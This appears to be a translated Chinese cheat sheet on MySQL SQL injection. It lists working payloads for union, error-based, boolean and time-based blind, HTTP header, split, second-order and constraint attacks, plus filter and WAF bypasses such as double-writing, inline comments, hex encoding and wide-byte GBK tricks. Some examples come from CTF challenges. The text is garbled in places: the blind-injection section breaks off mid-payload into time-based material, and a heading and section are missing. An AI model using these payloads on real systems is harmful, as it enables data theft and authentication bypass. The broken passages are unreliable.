# SQL注入基础整理及Tricks总结
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
前言：对已知的SQL注入手段作了较为全面和详尽的整理，大概是我几年的全部积累了，虽然可能有许多遗漏的地方，但我相信还是很有参考价值的。
本文的注入场景为：
## 一、基础注入
### **1.联合查询**
即最常见的union注入：
若前面的查询结果不为空，则返回两次查询的值：
若前面的查询结果为空，则只返回union查询的值：
查完数据库接下来就要查表名：
    ' union select group_concat(table_name) from information_schema.tables where table_schema=database()%23
接下来是字段名：
    ' union select group_concat(column_name) from information_schema.columns where table_name='table1'%23
得到字段名后查询相应字段：
    ' union select flag from table1%23
一个基本的SQL注入过程就结束了。
###  2.报错注入
报错注入是利用mysql在出错的时候会引出查询信息的特征，常用的报错手段有如下10种：
    1.floor()
    select * from test where id=1 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a);
    2.extractvalue()
    select * from test where id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));
    3.updatexml()
    select * from test where id=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1));
    4.geometrycollection()
    select * from test where id=1 and geometrycollection((select * from(select * from(select user())a)b));
    5.multipoint()
    select * from test where id=1 and multipoint((select * from(select * from(select user())a)b));
    6.polygon()
    select * from test where id=1 and polygon((select * from(select * from(select user())a)b));
    7.multipolygon()
    select * from test where id=1 and multipolygon((select * from(select * from(select user())a)b));
    8.linestring()
    select * from test where id=1 and linestring((select * from(select * from(select user())a)b));
    9.multilinestring()
    select * from test where id=1 and multilinestring((select * from(select * from(select user())a)b));
    10.exp()
    select * from test where id=1 and exp(~(select * from(select user())a));
效果：
###  3.布尔盲注
常见的布尔盲注场景有两种，一是返回值只有True或False的类型，二是Order by盲注。
**返回值只有True或False的类型**
如果查询结果不为空，则返回True（或者是Success之类的），否则返回False
这种注入比较简单，可以挨个猜测表名、字段名和字段值的字符，通过返回结果判断猜测是否正确
例：parameter=’ or ascii(substr((select database()) ,1,1))114,sleep(3),0)%23
查询结果正确，则延迟3秒，错误则无延时。
**2.benchmark()**
通过大量运算来模拟延时：
    id=' or benchmark(10000000,sha(1))%23
    id=' or if(ascii(substr(database(),1,1))>114,benchmark(10000000,sha(1)),0)%23
本地测试这个值大约可延时3秒：
**3.笛卡尔积**
计算笛卡尔积也是通过大量运算模拟延时：
    select count(*) from information_schema.tables A,information_schema.tables B,information_schema.tables C
    select balabala from table1 where '1'='2' or if(ascii(substr(database(),1,1))>0,(select count(*) from information_schema.tables A,information_schema.tables B,information_schema.tables C),0)
笛卡尔积延时大约也是3秒
**4.get_lock**
属于比较鸡肋的一种时间盲注，需要两个session，在第一个session中加锁：
    select get_lock('test',1)
然后再第二个session中执行查询：
    select get_lock('test',5)
另一个窗口：
**5.rlike+rpad**
rpad(1,3,’a’)是指用a填充第一位的字符串以达到第二位的长度  
经本地测试mysql5.7最大允许用单个rpad()填充349525位，而多个rpad()可以填充4个349525位，  
因此可用：
    select * from table1 where 1=1 and if(mid(user(),1,1)='r',concat(rpad(1,349525,'a'),rpad(1,349525,'a'),rpad(1,349525,'a')) RLIKE '(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+asdasdsadasd',1);
以上所写是本地测试的最大填充长度，延时0.3秒，最后的asdasdasd对时间长度有巨大影响，可以增长其长度以增大时延  
这个长度大概是1秒：
    select * from table1 where 1=1 and if(mid(user(),1,1)='r',concat(rpad(1,349525,'a'),rpad(1,349525,'a'),rpad(1,349525,'a')) RLIKE '(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+asaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd',1);
这个长度大概是2秒：
    select * from table1 where 1=1 and if(mid(user(),1,1)='r',concat(rpad(1,349525,'a'),rpad(1,349525,'a'),rpad(1,349525,'a')) RLIKE '(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+asaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaadddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddasaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaadddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddasdasdasdasdasdasdasdasdasdasdasdadasdasdasdasdasdasdasdasdasdasdasd',1);
###  5.HTTP头注入
用于在cookie或referer中存储数据的场景，通常伴随着base64加密或md5等摘要算法，注入方式与上述相同。
###  6.HTTP分割注入
如果存在一个登录场景，参数为username&password
查询语句为select xxx from xxx where username=’xxx’ and password=’xxx’
但是username参数过滤了注释符，无法将后面的注释掉，则可尝试用 **内联注释** 把password注释掉，凑成一条新语句后注释或闭合掉后面的语句：
例如实验吧加了料的报错注入：
（来源：[https://www.cnblogs.com/s1ye/p/8284806.html）](https://www.cnblogs.com/s1ye/p/8284806.html%EF%BC%89)
这样就凑成了如下的语句,将password参数直接注释掉：
    select * from users where username='1' or extractvalue/*'and password='1*/(1,concat(0x7e,(select database()),0x7e))) or '';
当然这种注入的前提是 **单引号没有被过滤** 。如果过滤不太多的话，其实也有很多其他的方式如：
    POST username=1' or if(ascii(substr(database(),1,1))=115,sleep(3),0) or '1&password=1
    凑成：
    select * from users where username='1' or if(ascii(substr(database(),1,1))>0,sleep(3),0) or '1' and password='1'
还有一个例子是GYCTF中的一道sql注入题，通过注入来登录：
[](https://imgchr.com/i/YUMyIe)
过滤了空格,union,#,—+,/*,^,or,|
这样上面用类似or ‘1’=’1’万能钥匙的方式来注入就不太可能了。
可以考虑 **将password作为函数的参数** 来闭合语句：
    username=admin'and(strcmp(&password=,'asdasdasdasdasdasd'))and'1
    这样凑成：
    select username from users where username='admin'and(strcmp('and password=','asdasdasdasdasdasd'))and'1'
strcmp比较，二者不一致返回True，一致返回False，而MySQL会将’1’判断为数字1，即True，因此该查询语句结果为True
###  7.二次注入
二次注入就是攻击者构造的恶意payload首先会被服务器存储在数据库中，在之后取出数据库在进行SQL语句拼接时产生的SQL注入问题
假如登录/注册处的SQL语句没有可以注入的地方，并将username储存在session中，而在登录之后页面查询语句没有过滤，为：
select * from users where username=’$_SESSION[‘username’]’
则我们在注册的时候便可将注入语句写入到session中，在登录后再查询的时候则会执行SQL语句：
如username=admin’#，登录后查询语句为：
    select * from users where username='admin' #'
就构成了SQL注入。
###  8.SQL约束攻击
假如注册时username参数在mysql中为 **字符串** 类型，并且有 **unique属性** ，设置了长度为VARCHAR(20)。
则我们注册一个username为admin[20个空格]asd的用户名，则在mysql中首先会判断是否有重复，若无重复，则会 **截取前20个字符**
加入到数据库中，所以数据库存储的数据为admin[20个空格]，而进行登录的时候，SQL语句会 **忽略空格** ，因此我们相当于覆写了admin账号。
## 二、基础绕过
###  1.大小写绕过
用于过滤时没有匹配大小写的情况：
SelECt * from table;
###  2.双写绕过
用于将禁止的字符直接删掉的过滤情况如：
preg_replace(‘/select/‘,’’,input)
则可用seselectlect _from xxx来绕过，在删除一个select后剩下的就是select_ from xxx
###  3.添加注释
    /*! */类型的注释，内部的语句会被执行
本地mysql5.7测试通过：
可以用来绕过一些WAF，或者绕过 **空格**
但是，不能将关键词用注释分开，例如下面的语句是不可以执行的（或者说只能在某些较老的版本执行）：
    select bbb from table1 where balabala='' union se/*!lect database()*/;
### **4.使用16进制绕过特定字符**
如果在查询字段名的时候表名被过滤，或是数据库中某些特定字符被过滤，则可用16进制绕过：
    select column_name from information_schema.columns where table_name=0x7573657273;
0x7573657273为users的16进制
###  5.宽字节、Latin1默认编码
**宽字节注入**
用于 **单引号被转义** ，但编码为 **gbk编码** 的情况下，用特殊字符将其与反斜杠合并，构成一个特殊字符：
    username = %df'#
    经gbk解码后变为：
    select * from users where username ='运'#
成功闭合了单引号。
**Latin1编码**
Mysql表的编码默认为latin1，如果设置字符集为utf8，则存在一些latin1中有而utf8中没有的字符，而Mysql是如何处理这些字符的呢？
**直接忽略**
于是我们可以输入?username=admin%c2，存储至表中就变为了admin
上面的%c2可以换为%c2-%ef之间的任意字符
###  6.各个字符以及函数的代替
**数字的代替：**
摘自[MySQL注入技巧](https://wooyun.js.org/drops/MySQL%E6%B3%A8%E5%85%A5%E6%8A%80%E5%B7%A7.html)
代替字符 | 数 | 代替字符 | 代替的数 | 数、字 | 代替的数  
---|---|---|---|---|---  
false、!pi() | 0 | ceil(pi()*pi()) | A | ceil((pi()+pi())*pi()) | K  
true、!(!pi()) | 1 | ceil(pi()*pi())+true | B | ceil(ceil(pi())*version()) | L  
true+true | 2 | ceil(pi()+pi()+version()) | C | ceil(pi()*ceil(pi()+pi())) | M  
floor(pi())、~~pi() | 3 | floor(pi()*pi()+pi()) | D |
ceil((pi()+ceil(pi()))*pi()) | N  
ceil(pi()) | 4 | ceil(pi()*pi()+pi()) | E | ceil(pi())*ceil(version()) | O  
floor(version()) //注意版本 | 5 | ceil(pi()*pi()+version()) | F |
floor(pi()*(version()+pi())) | P  
ceil(version()) | 6 | floor(pi()*version()) | G | floor(version()*version()) |
Q  
ceil(pi()+pi()) | 7 | ceil(pi()*version()) | H | ceil(version()*version()) | R  
floor(version()+pi()) | 8 | ceil(pi()*version())+true | I | ceil(pi() _pi()_
pi()-pi()) | S  
floor(pi()*pi()) | 9 | floor((pi()+pi())*pi()) | J | floor(pi() _pi()_
floor(pi())) | T  
其中!(!pi())代替1本地测试没有成功，还不知道原因。
**常用字符的替代**
    and -> &&
    or -> ||
    空格-> /**/ -> %a0 -> %0a -> +
    # -> --+ -> ;%00(php or '1'='1
    = -> like -> regexp -> <> -> in
    注：regexp为正则匹配，利用正则会有些新的注入手段
**常用函数的替代**
字符串截取/拼接函数：
摘自
函数 | 说明  
---|---  
SUBSTR(str,N_start,N_length) | 对指定字符串进行截取，为SUBSTRING的简单版。  
SUBSTRING() | 多种格式`SUBSTRING(str,pos)、SUBSTRING(str FROM
pos)、SUBSTRING(str,pos,len)、SUBSTRING(str FROM pos FOR len)`。  
RIGHT(str,len) | 对指定字符串从 **最右边** 截取指定长度。  
LEFT(str,len) | 对指定字符串从 **最左边** 截取指定长度。  
RPAD(str,len,padstr) | 在 `str` 右方补齐 `len` 位的字符串 `padstr`，返回新字符串。如果 `str` 长度大于
`len`，则返回值的长度将缩减到 `len` 所指定的长度。  
LPAD(str,len,padstr) | 与RPAD相似，在`str`左边补齐。  
MID(str,pos,len) | 同于 `SUBSTRING(str,pos,len)`。  
INSERT(str,pos,len,newstr) | 在原始字符串 `str` 中，将自左数第 `pos` 位开始，长度为 `len`
个字符的字符串替换为新字符串 `newstr`，然后返回经过替换后的字符串。`INSERT(str,len,1,0x0)`可当做截取函数。  
CONCAT(str1,str2…) | 函数用于将多个字符串合并为一个字符串  
GROUP_CONCAT(…) | 返回一个字符串结果，该结果由分组中的值连接组合而成。  
MAKE_SET(bits,str1,str2,…) |
根据参数1，返回所输入其他的参数值。可用作布尔盲注，如：`EXP(MAKE_SET((LENGTH(DATABASE())>8)+1,'1','710'))`。  
函数/语句 | 说明  
---|---  
LENGTH(str) | 返回字符串的长度。  